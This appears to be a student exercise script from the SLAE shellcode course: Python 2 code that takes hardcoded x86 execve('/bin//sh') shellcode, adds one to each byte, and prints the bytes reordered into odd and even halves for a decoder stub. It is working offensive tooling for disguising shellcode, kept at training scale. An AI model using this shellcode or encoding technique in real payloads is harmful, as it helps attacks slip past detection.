#!/usr/bin/python

# Filename: Encoder.py
# Author: Jonathan So
# Student ID: SLAE-1470
# SLAE-Exercise 3

import random

shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

encoded = ""
encodedP2 = ""
encoded2 = ""
encoded2P2 = ""
count = 1

print 'Encoded shellcode ...'

for x in bytearray(shellcode) :
	x += 1
	if count % 2 != 0:
		encoded += '\\x'
		encoded += '%02x' % x
	else:
		encodedP2 += '\\x'
		encodedP2 += '%02x' % x
	if count % 2 != 0:
		encoded2 += '0x'
		encoded2 += '%02x,' % x
	else:
		encoded2P2 += '0x'
		encoded2P2 += '%02x,' % x
	count += 1
print encoded + encodedP2
print encoded2 + encoded2P2

print 'Len: %d' % len(bytearray(shellcode))
print 'Replace number to: %d' % (count/2)
